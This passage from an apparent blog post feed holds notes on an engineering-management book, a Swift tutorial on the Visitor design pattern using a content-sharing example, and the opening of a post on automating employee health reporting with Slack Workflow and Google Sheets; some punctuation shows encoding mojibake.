need to be both engineers and managers. What should we do?The author suggests creating two Calendars: one as Maker (engineer) and one as Manager. Every morning, spend 15‚Äì30 minutes organizing your thoughts, planning the day‚Äôs schedule, deciding what tasks to do, what meetings you have, and identifying continuous free time slots to tackle tasks (as Maker).Author‚Äôs Calendar TemplateWe also need focused timeThe author states that although we are now managers, we still need to handle tasks; the available focus time during gaps is more important to us than before.The author mentions that you can use certain actions to signal your teammates during focused times, indicating ‚ÄúPlease do not disturb me for now!‚ÄùMethods include: going to the conference room, wearing headphones, or even buying an ON AIR! switch light to place on the desk.If it‚Äôs not an urgent issue, you can ask your teammates to leave comments or compile information in an email for you to handle after your focused work time.Assessing Tasks You Can Complete as an Engineer Within Your Available TimeSince I can no longer focus solely on development tasks like when I was purely an engineer (Maker), I need to choose tasks that I can personally execute based on the available time in the engineer‚Äôs schedule.Do not become the technical bottleneck of the team. Our mission is to enhance team capabilities, explore new technologies, and broaden the company‚Äôs internal and external technical perspectives. Possible tasks include researching technical issues in advance, sharing findings with teammates and letting them execute, resolving company technical debt, improving processes to boost development efficiency, adopting new technologies, open-sourcing company technology, providing open APIs, hosting external hackathons, and more.The Most Important Thing Is BalanceThe author suggests starting with a 15‚Äì20% ratio. Originally, it was 100% as Maker, but now it could be 20% as Maker / 80% as Manager (depending on the actual team size and member capabilities; the author also mentions 50% / 50% is possible). The key point is not to spend 100% of the time on engineering development but to invest more effort in management.Make Good Use of 1:1Regularly hold 1:1 meetings with teammates to give mutual feedback and share what you have learned.If managerial tasks consume all your timeThe author finally mentions that if you manage too many tasks and cannot do engineering work (as a Maker), or if you feel disconnected from tasks and technology, consider working from home a few days a week to isolate from the company or participate in hackathons.Lesson 2. ‚Äî Code Review‚Äù Your Management DecisionsRegularly review the decisions you make as a manager.As engineers, we have many methods or tools to improve our skills by following them, such as pair programming, code review, and design patterns; but as managers, especially beginners, we often feel quite lonely.We don‚Äôt want to admit our ignorance about superiors or subordinates, fear taking responsibility for the team‚Äôs success, or worry about balancing technical (debt) and business needs.The author mentions stepping out to seek ways to improve management skills, openly requesting feedback, and enhancing management abilities; being as passionate about managing as when working as an engineer.Record &amp; Review DecisionsColleagues and bosses are powerful resources we often underestimate. We can quickly learn from their feedback; establishing good records and reviewing decisions regularly helps us receive better feedback.The author mentioned: ‚ÄúThere is no one right way, there are only tradeoffs.‚ÄùI think so too. If it weren‚Äôt a dilemma, you probably wouldn‚Äôt ask me; asking means your teammates don‚Äôt know how to decide.We can list the options and provide decisions to teammates, but at the same time, we must record the decisions made.Template of the Record Sheet Provided by the AuthorDevelop the habit of keeping records, and make sure the content can be recalled later.The author suggests reviewing monthly and sharing the discussion and decisions with your boss, other managers, or colleagues (at least half of the issues). Listen to others‚Äô opinions; anonymity can protect the individuals involved, focus on the issue, not the person, and keep a record.Key Points for Retrospective ReviewAbout the Issue: How many technical issues does it cause? Is it a personal issue? Is it just an individual member‚Äôs isolated issue? (Is it simply that they don‚Äôt understand the goal?) Does this issue occur repeatedly in other teams as well? About Decision Making: Does this issue really need to be decided by the manager? Have you asked your teammates for their suggestions? Is there anyone more experienced who can offer advice? Would you make the same decision if you reconsider now? Lesson 3. ‚Äî Confront and challenge your teammatesEncourage teammates to step out of their comfort zones while avoiding becoming a jerk or falling into traps.The author mentioned that at first, he was very uncomfortable because a friend who was once a colleague became his subordinate. He feared damaging their original relationship, so he took on all the finishing tasks by himself. However, he eventually realized that the more he tried to protect the relationship, the more distant he became from his teammates. His constant solitary hard work and lack of sharing caused his teammates to lose confidence.Looking back, the author says that instead of fearing hurting teammates‚Äô feelings, it‚Äôs better to speak your true thoughts. The fear of ‚Äúhurting teammates‚Äù is simply a selfish imagination and unnecessary. Moreover, as a manager, it is your responsibility to lead the team forward and grow; you must have a broad perspective and control risks.Sharing honest thoughts is difficult for both parties, but it is the responsibility of a manager.We need to show empathy, not sympathy. To help them truly excel in their work, they need our objective feedback.The author provides the following three points to help us balance emotions and behavior: Did I show empathy? Yes, you have clearly stated your expectations. Have I led by example? ‚ÄúIf you want to achieve anything in this world, you have to get used to the idea that not everyone will like you.‚Äù If you want to achieve something, you must get used to the fact that not everyone will like your ideas.Four Common Pitfalls: Compared to hiding, have I openly shared my failures? (This can be through writing articles or emailing everyone) Forget to summarize discussion results (get used to recording 1:1 and discussion outcomes) Using the wrong feedback medium, failing to identify the real issue (find the appropriate feedback channel based on team culture, e.g., 1:1) Delayed FeedbackWe need to recognize that engineers enjoy challenging themselves and improving their skills, while also wanting respect and feedback from their supervisors. Our mission is to lead the team‚Äôs growth, so we should not delay whenever there is an opportunity to give feedback. Not making a decision is also a decision. Moreover, once the culture of feedback weakens, it becomes even harder to reignite. SummaryCan take time to write down ways to motivate teammates and ask the supervisor if they are being too protective of the teammates?Lesson 4. ‚Äî Teach how to get things doneHow to complete tasks with lower risk.Leading by example is a good approach. Occasionally participate in the team‚Äôs development to demonstrate how to plan and produce quality features that convey our ideas. Also, focus more on explaining the Why? (why we do it this way) and less on the How? (how to do it).The author mentions that a highly transparent culture provides team members with complete context, enhancing their ability to drive decisions.Reduce Risk To reduce production risks, the author suggests breaking down requirements into many small iterative features and sharing this idea with other teams. Scale and performance ‚Äî always have a backup planWill this feature affect performance (or cause other issues)? Can it be known in advance? Is there a backup plan (toggle)? If there is no backup plan, it‚Äôs better not to implement it, as it can affect team confidence. Break tasks into smaller sub-tasks to reduce deadline risksIt may be difficult at first, but it can be trained and learned Leverage Peer PressureDivide tasks among teammates for joint collaboration, working together to achieve goals (Code Review is also part of this). Continuous Internal and External CommunicationInternal: Ensure expectations, synchronization, deadlines, and resources.External: Communicate clearly; if time is tight, cancel unimportant meetings. Support, Bug Fixes, DocumentationIt‚Äôs not enough to just release features; you also need to provide good customer support, fix bugs, and maintain documentation. Conduct thorough reviews and delegate tasks to provide others with leadership opportunities Select a few tasks that can lead by example Ask teammates about what they have learned, what motivates them to be more proactive, and what they dislike. Lesson 5. ‚Äî Delegate tasks without losing quality or visibilityDelegate tasks without losing quality and visibility.As a manager, it is essential to delegate tasks properly. The author believes delegation should involve setting clear expectations and trusting that the assigned team members have the ability to execute, the opportunity to learn, and the space to make mistakes. On the other hand, managers must also protect their team members from pressure coming from the company.The author used the following table for recording:This section mainly records tasks important to team goals; daily work does not need to be recorded. Must write down the task contentRegarding whether to delegate a task to teammates, the author first asks if the task can only be done by themselves and if it is something a manager should handle. The second question is whether the task is a long-term leadership responsibility; if neither is true, the task is delegated to teammates.For tasks to be delegated, evaluate teammates‚Äô experience and skills to find the right candidate. External Resources or Expected Resources Above (Feedback/Tool) Delegate For the Delegate section, we can provide a one-page paper explaining our expectations and a simple example.Lesson 6. ‚Äî Build trust with other teams in the organizationTeamwork and seamless collaboration between teams.The author explains that organizations split into many small teams to enable faster decision-making and handle more tasks; defining each team‚Äôs direction is actually easy (e.g., iOS team focuses on iOS apps), but aligning the goals of all teams is the difficult part.The more groups there are, the harder it is to unify everyone‚Äôs values, expectations, priorities, and implicit assumptions.Focus on the reasons and motivations for splitting the team rather than the output; otherwise, it may lead to conflicts.The author suggests the following methods to align the directions of each team: The team should have a vision, not just complete tasks well. Managers need to distinguish between needs and wants. Optimize the team to complete the right tasks faster, not just more tasks. Establish Good Communication with Other Team ManagersThe author suggests sharing your team‚Äôs status, obstacles, challenges, upcoming main tasks, and their reasons during the biweekly managers‚Äô meetings. When there is a difference in priority opinions with other teams, you can explain by bringing up other factors (e.g., completing this task can reduce customer service complaints, provide a one-time permanent solution, or create a synergistic effect‚Ä¶). First, understand where the external team needs our help and proactively follow up closely. Next, we present the points where our team needs help from external teams. Make a checklist to confirm all points are discussed during the meeting; if not, follow up with relevant managers afterward to explore other possibilities. If it is not possible, weigh the potential delay or alternative solutions, and inform stakeholders to prevent behind-the-scenes complaints. Everything Is a Trade-off Here are 5 more ways teammates can build close relationships with other teams: Simple Thank You Letter (Appreciation for Assistance) Exchange Team Work Internal Tech Annual Meeting, Sharing with Each Other Observe user behavior together and brainstorm optimization ideas collaboratively Invite a teammate from another team to join our work Summary ‚ÄúImagine that someone from Team A drops a feature that Team B needs due to an urgent support issue. Without communicating this priority change to Team B, trust will decrease even if the priority change is justified.‚Äù„Äå difference between transactional trust and relational/emotional trust „Äç Understand Transactional Trust and Relational Trust. Transactional Trust ‚Äî Whether people will keep their promises and complete tasks Relational Trust ‚Äî Whether people act in ways that build and protect relationships Lesson 7. ‚Äî Optimize for business learningBuilding a business learning culture instead of just creating a culture, optimizing throughput, and optimizing value. Premature Optimization Is a Disaster Focus on solving current problems, not optimizing for the sake of optimization. Even if we are not responsible for the entire project, we can still optimize internal operations. Major successes often come from the accumulation of small improvements. As managers, we must demonstrate the motivation behind our decisions Establish a business learning (value) culture and build a culture (the focus is not on creating solutions, but on the business problems we aim to solve) Optimization of Efficiency vs Optimization of Throughput: Optimization of Efficiency: Reducing the time to complete a single taskOptimization of Throughput: Increasing the number of tasks completed within a time period (e.g., a quarter) Know the impact of each optimization, The Importance of Automation (Save Time Once and for All) Optimize Value Using the AARRR Principle: Acquisition: How to attract more users Activation: How to guide users to complete tasks that help them understand the product‚Äôs value (e.g., Alarm App, onboarding users to set up an alarm) Retention: Increase return visits and usage frequency Referrer: Let your users and content bring more traffic Revenue: Digitally assess the revenue generated by users These five items are closely related. If Retention is low, you might consider adjusting Referrer and Acquisition simultaneously.As engineering managers, our role is not to bury ourselves in coding or focus solely on technology; we should periodically realign with the product‚Äôs value.When the product is still in the early market testing phase, the focus should be on optimizing efficiency (quickly completing tasks) by repeatedly following this process:Features can improve retention -&gt; Release features -&gt; Learn -&gt; Adjust &amp; repeat.Evaluate areas for improvement at each stage from feature assessment to release (spending too much time on design? On discussions?)Can you invest 20% of the time to reduce 80% of the development time? Especially the painful parts.Can we first experiment or release it to a minimal audience? This avoids having a large feature set that ends up unused. To effectively track data, you must understand the results of your efforts ‚ÄúIf you can‚Äôt make engineering decisions based on data, then make engineering decisions that result in data.‚ÄùAlthough ‚Äúthe company will fail without this feature‚Äù is certainly more alarming than ‚Äúthis feature will cause technical debt,‚Äù as managers, if we can secure more time to address technical debt, we should do so. We must ensure proper communication and control.Optimizing code that may never be used is not very meaningful. After the initial trial phase, the product model becomes stable; this is the right time to optimize throughput (e.g., given X resources, achieve Y output). Provide business requirements predictability (as above) Track team output (e.g., ‚Äú01/01/2013‚Äì14/01/2013: 2 Large features, 5 Medium features, 4 Small‚Äù), and use long-term statistics to provide forecasts.Identify &amp; Solve Bottlenecks: Synchronous communication: For example, in the product development process, design resources are needed. When entering the engineering development phase, do we already have clear specifications to proceed with development? Or are we still waiting? Is there anything we can do in the meantime? Infrastructure: Making Code Scalable and Maintainable Automation: Use automation to handle tedious manual tasks, saving time and reducing errors Because business strategies constantly change, we should maintain a more open and flexible mindset toward optimization strategies. The summary of optimization should still focus on business needs.Lesson 8. ‚Äî Use Inbound Recruiting to attract better talentAbout Recruitment.You should start doing the following tasks regularly. If you wait until suddenly lacking talent, you will have to rely on traditional recruitment methods, conducting endless interviews but still struggling to find the right candidates.Internal: Cultivate a good engineering culture environment (e.g., Code Review, annual meetings‚Ä¶) Create an Attractive Work Environment Manage it like a brand Team Members Collaborating Strengthen human connections (e.g., birthday celebrations) First, make members feel proud of the team External: The internal team regularly answers community questions weekly (e.g., Stackoverflow, etc.) to increase exposure. Hiding recruitment Easter eggs in code (e.g., Web Developer Tools) Sharing with the community the problems our team encountered and the solutions we found (Article or Talk) Hosting a hackathon Creating a side project (e.g., Open Source Project) Assign the above tasks to team members so everyone can contribute to finding great talent together.Lesson 9. ‚Äî Build a scalable teamBuilding a scalable team.Building scalable software was our previous responsibility as engineers, but now the challenge is to create a scalable team.Unlike programs, people have expectations, needs, and dreams to consider.The author wants to create a happy work environment where teammates understand the expectations of tasks and face new challenges; and to maintain this passion continuously. Aligning GoalsAlign personal vision with company goals. Without understanding the current company objectives, team dysfunction is likely to occur. Aligning Core ValuesIt is a consensus and tacit understanding about ways of working and what is important; team core values are not fixed and should evolve with the times. BalanceAssign different visions, autonomy, and ownership according to team members‚Äô roles and growth; collaborate and grow together (e.g., newcomers expect to understand company workflows, veterans handle code reviews and mentoring); everyone should have opportunities for growth. The core values of the group outweigh those of the individual.This may lead to some people leaving and requires patience and time to achieve; there are also many challenges (e.g., when someone leaves, they may question the core values). AchievementResults should bring a sense of achievement. As a manager, you must not let your team lose their enthusiasm. Practice Define the team visionEX: The author‚Äôs team works on web crawling, and their team vision is ‚ÄúTo build the largest, most informative profile-database in the world.‚ÄùPlease note this is a vision, not a short-term goal or something they don‚Äôt want to do. Define Core Team ValuesWhen selecting core values, ask yourself, ‚ÄúIs this value so important that someone would be fired for lacking it?‚ÄùWrite down the core values and their reasons.The author provides the following core values he wrote: Do not let others (other teams) clean up the mess; the team must take responsibility for its own mistakes. Maintain loyalty and respect toward all team members.Having core values provides clearer criteria for recruitment and dismissal, and sets a standard for how to work. Define Members‚Äô Expectations of the Team and Managers Provide a productive and happy work environment Understand the Why of a Task, Not the How Receive genuine feedback Opportunity to lead other members Able to share work results Define Expectations for Team MembersBasic Expectations: Task completed Maintain a passion for learning Keep the passion for sharing and teaching Understand the bottom line of doing things sensibly Personal Expectations: Set Expectations According to Capability Able to Train Others to Adapt Promote Change Instead of Complaining We are a team. Each member has their own responsibilities and deliverables, while also collaborating with others, helping each other, and growing together. Defining expectations is like a contract; under the shift from colleague relationships to managerial ones, it enables better and more purposeful leadership. Defining these items is not easy and requires time and patience to iterate. ‚ÄúYou can‚Äôt empower people by approving their actions. You empower by designing the need for your approval out of the system.‚ÄùIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Visitor Pattern in iOSÔΩúSwift Design Pattern Practical Applications", "url": "/posts/zrealm-dev/visitor-pattern-in-ios-swift-design-pattern-practical-applications-ba5773a7bfea/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, design-patterns, visitor-pattern, double-dispatch, english, ai-translation", "date": "2021-06-15 23:58:36 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Visitor Pattern in Swift (Share Object to XXX Example)Analysis of Practical Us...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Visitor Pattern in Swift (Share Object to XXX Example)Analysis of Practical Use Cases for the Visitor Pattern (Sharing Products, Songs, Articles‚Ä¶ to Facebook, Line, LinkedIn‚Ä¶ Scenarios)Photo by Daniel McCulloughPrefaceI have known about ‚ÄúDesign Patterns‚Äù for over 10 years now, but I still can‚Äôt confidently say that I fully master them. I‚Äôve always had a vague understanding and have gone through all the patterns several times, but without internalizing or applying them in practice, I quickly forget them. I‚Äôm really useless.Internal Skills and TechniquesA great analogy I once saw is that techniques like PHP, Laravel, iOS, Swift, SwiftUI, and similar applications have relatively low learning barriers when switching between them. However, fundamentals such as algorithms, data structures, and design patterns belong to the core skills. Core skills and techniques complement each other, but techniques are easier to learn while core skills are harder to master. A person skilled in techniques may not have strong core skills, but someone with strong core skills can quickly learn techniques. Therefore, rather than just complementing each other, core skills are the foundation that, combined with techniques, make one invincible.Find a Learning Method That Suits YouBased on my previous learning experience, I believe the best way for me to learn Design Patterns is to master a few patterns deeply first; focus on internalizing and flexibly applying them, while developing the intuition to judge which pattern fits which scenario. Then, gradually accumulate knowledge of new patterns until fully mastered. I think the best approach is to find practical scenarios and learn through application.Learning ResourcesHere are two recommended free learning resources: Swift Playgrounds - An interactive app by Apple to learn Swift programming with fun exercises. Ray Wenderlich Tutorials - A collection of free tutorials and articles on iOS development and design patterns including Visitor pattern. https://refactoringguru.cn/: A complete introduction to all pattern structures, scenarios, and relationships https://shirazian.wordpress.com/2016/04/11/design-patterns-in-swift/: The author introduces the application of various patterns through real iOS development scenarios. This article will also be written with the same approach. Visitor ‚Äî Behavioral PatternsChapter 1 records the Visitor Pattern, which is one of the treasures I discovered after working at StreetVoice for a year. The StreetVoice app has many places that effectively use Visitor to solve architectural problems. During this experience, I also grasped the core principles of Visitor. So, the first chapter is dedicated to it!What is VisitorFirst, understand what Visitor is. What problem does it aim to solve? What is its structure?Image taken from refactoringguruThe detailed content will not be repeated here. Please first refer directly to refactoringguru‚Äôs explanation of Visitor.iOS Practical Scenario ‚Äî Sharing FeatureAssume we have the following Models: UserModel, SongModel, and PlaylistModel. Now, we want to implement a sharing feature that can share to Facebook, Line, and Instagram. Each Model needs to present different sharing messages, and each platform requires different data:The combined scenario is shown in the above image. The first table displays the customized content for each Model, and the second table shows the data required by each sharing platform. Especially Instagram requires multiple images when sharing a Playlist, which differs from the sources needed for other shares.Define ModelFirst, define the properties for each Model:// Modelstruct UserModel { let id: String let name: String let profileImageURLString: String}struct SongModel { let id: String let name: String let user: UserModel let coverImageURLString: String}struct PlaylistModel { let id: String let name: String let user: UserModel let songs: [SongModel] let coverImageURLString: String}// Datalet user = UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\")let song = SongModel(id: \"1\", name: \"Wake me up\", user: user, coverImageURLString: \"https://zhgchg.li/cover/1.png\")let playlist = PlaylistModel(id: \"1\", name: \"Avicii Tribute Concert\", user: user, songs: [ song, SongModel(id: \"2\", name: \"Waiting for love\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/3.png\"), SongModel(id: \"3\", name: \"Lonely Together\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/1.png\"), SongModel(id: \"4\", name: \"Heaven\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/4.png\"), SongModel(id: \"5\", name: \"S.O.S\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/5.png\")], coverImageURLString: \"https://zhgchg.li/playlist/1.png\")The Approach Without Any ThoughtWithout considering architecture at all, first implement the dirtiest approach without any thought.Stephen Chow ‚Äî God of Cookeryclass ShareManager { private let title: String private let urlString: String private let imageURLStrings: [String] init(user: UserModel) { self.title = \"Hi, sharing with you an amazing artist \\(user.name).\" self.urlString = \"https://zhgchg.li/user/\\(user.id)\" self.imageURLStrings = [user.profileImageURLString] } init(song: SongModel) { self.title = \"Hi, sharing a great song I just heard, \\(song.user.name)'s \\(song.name).\" self.urlString = \"https://zhgchg.li/user/\\(song.user.id)/song/\\(song.id)\" self.imageURLStrings = [song.coverImageURLString] } init(playlist: PlaylistModel) { self.title = \"Hi, I can't stop listening to this playlist \\(playlist.name).\" self.urlString = \"https://zhgchg.li/user/\\(playlist.user.id)/playlist/\\(playlist.id)\" self.imageURLStrings = playlist.songs.map({ $0.coverImageURLString }) } func shareToFacebook() { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![\\(self.title)](\\(String(describing: self.imageURLStrings.first))](\\(self.urlString))\") } func shareToInstagram() { // call Instagram share sdk... print(\"Share to Instagram...\") print(self.imageURLStrings.joined(separator: \",\")) } func shareToLine() { // call Line share sdk... print(\"Share to Line...\") print(\"[\\(self.title)](\\(self.urlString))\") }}Nothing much to say, it‚Äôs a zero-architecture mess all mixed together. If you want to add a new sharing platform, change the sharing info of a platform, or add a shareable Model, you have to modify ShareManager. Also, the design of imageURLStrings was made an array because Instagram requires a group of images when sharing playlists. This is a bit backwards, designing the architecture based on specific needs, which pollutes other types that don‚Äôt need image groups.Optimize a bitSeparate the logic slightly.protocol Shareable { func getShareText() -&gt; String func getShareURLString() -&gt; String func getShareImageURLStrings() -&gt; [String]}extension UserModel: Shareable { func getShareText() -&gt; String { return \"Hi, sharing with you a great artist \\(self.name).\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.profileImageURLString] }}extension SongModel: Shareable { func getShareText() -&gt; String { return \"Hi, sharing a great song I just heard, \\(self.user.name)'s \\(self.name).\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/song/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}extension PlaylistModel: Shareable { func getShareText() -&gt; String { return \"Hi, I can't stop listening to this playlist \\(self.name).\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/playlist/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}protocol ShareManagerProtocol { var model: Shareable { get } init(model: Shareable) func share()}class FacebookShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![\\(model.getShareText())](\\(String(describing: model.getShareImageURLStrings().first))](\\(model.getShareURLString())\") }}class InstagramShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.getShareImageURLStrings().joined(separator: \",\")) }}class LineShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Line share sdk... print(\"Share to Line...\") print(\"[\\(model.getShareText())](\\(model.getShareURLString())\") }}We extracted a CanShare Protocol, so any Model conforming to this protocol supports sharing; the sharing part is also separated into ShareManagerProtocol. For new sharing features, just implement the protocol, and modifications or deletions won‚Äôt affect other ShareManagers.However, getShareImageURLStrings still behaves oddly. Moreover, if a newly added sharing platform requires a Model with vastly different data‚Äîfor example, WeChat sharing needs play count, creation date, and other info unique to it‚Äîthis will start to cause confusion.VisitorUsing the Visitor Pattern solution.// Visitor Versionprotocol Shareable { func accept(visitor: SharePolicy)}extension UserModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension SongModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension PlaylistModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}protocol SharePolicy { func visit(model: UserModel) func visit(model: SongModel) func visit(model: PlaylistModel)}class ShareToFacebookVisitor: SharePolicy { func visit(model: UserModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi, sharing a great artist \\(model.name) with you.](\\(model.profileImageURLString)](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi, sharing a great song I just heard, \\(model.user.name)'s \\(model.name), it was played.](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi, I can't stop listening to this playlist \\(model.name).](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToLineVisitor: SharePolicy { func visit(model: UserModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi, sharing a great artist \\(model.name) with you.](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi, sharing a great song I just heard, \\(model.user.name)'s \\(model.name), it was played.](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi, I can't stop listening to this playlist \\(model.name).](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToInstagramVisitor: SharePolicy { func visit(model: UserModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.profileImageURLString) } func visit(model: SongModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.coverImageURLString) } func visit(model: PlaylistModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.songs.map({ $0.coverImageURLString }).joined(separator: \",\")) }}// Use caselet shareToInstagramVisitor = ShareToInstagramVisitor()user.accept(visitor: shareToInstagramVisitor)playlist.accept(visitor: shareToInstagramVisitor)Let‚Äôs go through what was done line by line: First, we created a Shareable protocol, mainly to manage models that support sharing and provide a unified interface for the Visitor (optional to define). UserModel/SongModel/PlaylistModel implement Shareable func accept(visitor: SharePolicy). Later, if new models supporting sharing are added, they only need to implement the protocol. Define SharePolicy listing the supported Models(must be concrete type) You might wonder why not define it as visit(model: Shareable). Instead, that would repeat the previous version‚Äôs problem. Each Share method implements SharePolicy, assembling the required resources according to the source. Suppose we add WeChat sharing today, which requires special data (play count, creation date). It won‚Äôt affect existing code because it can get the information it needs from the concrete model. Achieve the goal of low coupling and high cohesion in software development.The above is a classic Visitor Double Dispatch implementation, but in daily development, we rarely encounter this situation. Usually, there is only one Visitor, but I think this pattern combination is still very suitable. For example, if there is a SaveToCoreData requirement, we can directly define accept(visitor: SaveToCoreDataVisitor) without declaring additional Policy Protocols, which is also a good architectural approach.protocol Saveable { func accept(visitor: SaveToCoreDataVisitor)}class SaveToCoreDataVisitor { func visit(model: UserModel) { // map UserModel to coredata } func visit(model: SongModel) { // map SongModel to coredata } func visit(model: PlaylistModel) { // map PlaylistModel to coredata }}Other Applications: Save, Like, tableview/collectionview cellforrow‚Ä¶.PrinciplesFinally, let‚Äôs discuss some common principles Code is meant to be read by humans; avoid over-designing. Consistency is important; the same scenario within the same codebase should use the same architectural approach. If the scope is controllable or no other situations can occur, continuing to break it down further can be considered Over Designed. Use more applications, less invention; Design Patterns have been in the software design field for decades, and the scenarios they consider are definitely more complete than creating a new architecture from scratch. If you don‚Äôt understand Design Patterns, you can learn them, but if it‚Äôs a framework you created yourself, it‚Äôs harder to convince others to learn it. Because even if they learn it, it might only apply to that specific case, so it won‚Äôt become common sense. Code duplication does not necessarily mean bad code. Overemphasizing encapsulation can lead to overdesign. As mentioned earlier, code is meant to be read by humans, so as long as it is readable with low coupling and high cohesion, it is good code. Do not arbitrarily alter the pattern. The original design always has its reasoning, and random changes may cause issues in certain scenarios. Once you start taking detours, you‚Äôll only go further off track, and the code will become messier. inspired by Ôº†saidayReferences Design Patterns in Swift: Visitor(Another practical use case of Visitor) https://github.com/kingreza/Swift-Visitor Deep Linking at Scale on iOS (State Pattern) Further Reading Practical Application Record of Design Patterns (Encapsulating Socket.io) Practical Application of Design Patterns (Encapsulating WKWebView) Visitor Pattern in TableView For any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Slack WorkflowÔΩúAutomate WFH Employee Health Reporting with Google Sheets & App Script", "url": "/posts/zrealm-dev/slack-workflow-automate-wfh-employee-health-reporting-with-google-sheets-app-script-d61062833c1a/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, automation, google-sheets, app-script, slack", "date": "2021-06-14 00:58:21 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Slack Builds a Fully Automated WFH Employee Health Status Reporting SystemMast...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Slack Builds a Fully Automated WFH Employee Health Status Reporting SystemMaster Slack Workflow with Google Sheets and App Script to Boost Work EfficiencyPhoto by Stephen Phillips ‚Äî Hostreviews.co.ukIntroductionIn response to full remote work, the company cares about the health of all members. Everyone must report their health status daily, which is centrally recorded and managed by People Operations.Our Flow Before Optimization [Automation] Slack Channel sends a daily reminder message at 10 AM to prompt everyone to fill out the health form (the only automated part before optimization) Employees click the link to open the Google Form and fill out health questions Save Data Back to Google Sheet Response Records [Manual] People Operations compares the list near the end of each workday to identify employees who forgot to fill in the form. [Manual] Send reminder messages in Slack Channel &amp; tag each person who forgot to fill in The above is our company‚Äôs health report tracking process. Each company varies based on size and operations. This article serves only as an optimization example to learn Slack Workflow usage and basic App Script writing. Actual implementation should be done on a case-by-case basis.Issues You need to exit the Slack context and open the Google Form webpage in a browser to fill it out, which is especially inconvenient on mobile devices. Google Form can only automatically include email addresses and cannot automatically add the respondent‚Äôs name or department information. Daily manual comparison and manual tagging are very time-consuming and labor-intensive. SolutionI have done quite a few small automation tasks. This process has a fixed data source (employee list), simple conditions, and routine actions; it clearly suits automation. Initially, I didn‚Äôt do it because I couldn‚Äôt find a good way to fill it out (actually, I couldn‚Äôt find an interesting point to research). So I just left it alone until I saw this post by Êµ∑Á∏ΩÁêÜ, which made me realize that Slack Workflow can not only send scheduled messages but also has a Form feature:Image 